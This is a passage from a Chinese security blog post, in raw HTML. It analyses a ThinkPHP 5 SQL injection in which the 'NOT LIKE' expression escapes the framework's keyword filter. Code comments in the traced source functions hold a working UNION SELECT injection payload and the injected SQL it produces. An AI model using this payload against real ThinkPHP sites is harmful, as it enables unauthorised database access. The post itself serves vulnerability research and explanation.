        $whereStr .= empty($whereStr) ? substr(implode(&apos; &apos;, $str), strlen($key) + 1) : implode(&apos; &apos;, $str);
    }

    return $whereStr;
</code></pre><p>E.跟进核心函数<code>parseWhereItem()</code>：</p>
<pre><code>#thinkphp\library\think\db\bulider.php 300行
protected function parseWhereItem($field, $val, $rule = &apos;&apos;, $options = [], $binds = [], $bindName = null)
    {
    ...
    // 检测操作符
    if (!in_array($exp, $this-&gt;exp)) {//进入
        $exp = strtolower($exp);
        if (isset($this-&gt;exp[$exp])) {
            $exp = $this-&gt;exp[$exp];
            //$exp:NOT LIKE
        } 
    ...
    $whereStr = &apos;&apos;;
    ...
    //like操作有关代码
    elseif (&apos;LIKE&apos; == $exp || &apos;NOT LIKE&apos; == $exp) {
        // 模糊匹配
        //$value:{ [0]=&gt;&quot;aaa&quot; [1]=&gt;&quot;bbb&quot; } 
        if (is_array($value)) {
            foreach ($value as $item) {
                $array[] = $key . &apos; &apos; . $exp . &apos; &apos; . $this-&gt;parseValue($item, $field);

            }
            $logic = isset($val[2]) ? $val[2] : &apos;AND&apos;;
            //$logic:) and 1=2 union select 1,user(),3 from user--
            //$array:`ID` NOT LIKE &apos;12&apos; 
            $whereStr .= &apos;(&apos; . implode($array, &apos; &apos; . strtoupper($logic) . &apos; &apos;) . &apos;)&apos;;
            //$whereStr:(`ID` NOT LIKE &apos;aaa&apos; ) AND 1=2 UNION SELECT 1,USER(),3 FROM USER-- `ID` NOT LIKE &apos;bbb&apos;)
        } 
</code></pre><p>可以看到我们TP框架并没有对我们传输进去的<code>$val</code>进行过滤 而直接拼接到<code>$whereStr</code>变量 最后拼接到<code>$sql</code>语句中 导致注入</p>
<p>F.我们看下tp框架系统核心函数之一的<code>input()</code>函数,它的功能是帮助我们获取各种变量及自动过滤:<br>我们跟进<code>thinkphp\library\think\Requests.php</code>的<code>input()</code>函数：<br>我们查看过滤器相关代码:</p>
<pre><code>#thinkphp\library\think\Requests.php 971行
public function input($data = [], $name = &apos;&apos;, $default = null, $filter = &apos;&apos;)
...   
$filter = $this-&gt;getFilter($filter, $default);
if (is_array($data)) {
    array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);
    reset($data);
} else {
    $this-&gt;filterValue($data, $name, $filter);
}

if (isset($type) &amp;&amp; $data !== $default) {
    // 强制类型转换
    $this-&gt;typeCast($data, $type);
}
return $data;
</code></pre><p>G.这里判断了变量是否为数组 这里调用了<code>filterValue()</code>函数进行过滤 跟进函数:</p>
<pre><code>#thinkphp\library\think\Requests.php 1054行
private function filterValue(&amp;$value, $key, $filters)
{
...
return $this-&gt;filterExp($value);
}
</code></pre><p>跟进<code>filterExp()</code>函数:</p>
<pre><code>public function filterExp(&amp;$value)
{
// 过滤查询特殊字符
if (is_string($value) &amp;&amp; preg_match(&apos;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&apos;, $value)) {
    $value .= &apos; &apos;;
}
// TODO 其他安全过滤
}
</code></pre><p>H.这个函数的作用很简单,判断传进来的表达式是否属于敏感关键字,如果是—&gt;关键字后加空格,来进行给过滤<br>如传进来的post数据:</p>
<pre><code>x[0]=in&amp;x[1]=1
</code></pre><p>服务器接收时如果没有进行过滤:</p>
<pre><code>$date[&apos;x&apos;] = array(&apos;in&apos;=&gt;&apos;1&apos;)
</code></pre><p>如果被<code>filterExp()</code>过滤后:</p>
<pre><code>$date[&apos;x&apos;] = array(&apos;in &apos;=&gt;&apos;1&apos;)
</code></pre><p>这样就无法被服务器解析 也就避免了漏洞</p>
<p>I.但是因为TP5重写了数据库操作的方法,忽略了一些敏感操作 导致我们可以绕过TP的过滤机制</p>
<pre><code>#thinkphp\library\think\db\bulider.php 重写表达式
</code></pre><p><img src="http://static.zybuluo.com/chhyx/et4fjnsfd12qyuq4brr50wqv/image_1co66mlsb18vjivu13ld1c9tgv49.png" alt="image_1co66mlsb18vjivu13ld1c9tgv49.png-61kB"></p>
<pre><code>#thinkphp\library\think\Requests.php  过滤表达式
</code></pre><p><img src="http://static.zybuluo.com/chhyx/fj5jkb1ax2z3mkcepx3wykfp/image_1co66ji7v9gm1os31p9hpgjj9o20.png" alt="image_1co66ji7v9gm1os31p9hpgjj9o20.png-26.2kB"></p>
<p>我们可看到这里漏掉了<code>not like</code>这个表达式(添加了一个表达式 但是并没有进行过滤),导致了注入。</p>
<p>##<strong>5.参考链接:</strong><br><a href="https://www.kancloud.cn/manual/thinkphp5/118044" target="_blank" rel="noopener">https://www.kancloud.cn/manual/thinkphp5/118044</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">P0rZ9</p>
              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">34</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">P0rZ9</span>

  
</div>









        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
